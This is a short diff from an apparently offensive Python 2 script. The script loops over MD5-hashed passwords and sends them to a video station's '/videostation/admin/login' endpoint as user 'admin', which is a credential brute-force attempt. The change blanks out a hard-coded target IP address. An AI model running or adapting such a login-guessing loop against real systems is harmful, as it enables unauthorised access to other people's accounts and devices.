@@ -14,7 +14,7 @@ while 1:
     	psw = m.hexdigest()
     	url = "/videostation/admin/login?username=admin&password="+str(psw)
     	httpClient=None
-    	httpClient=httplib.HTTPConnection('114.215.150.59',80,timeout=30)
+    	httpClient=httplib.HTTPConnection('',80,timeout=30)
     	headers={'Accept':'application/json'}
     	httpClient.request(method='GET',url=url,headers=headers)
     	response=httpClient.getresponse()
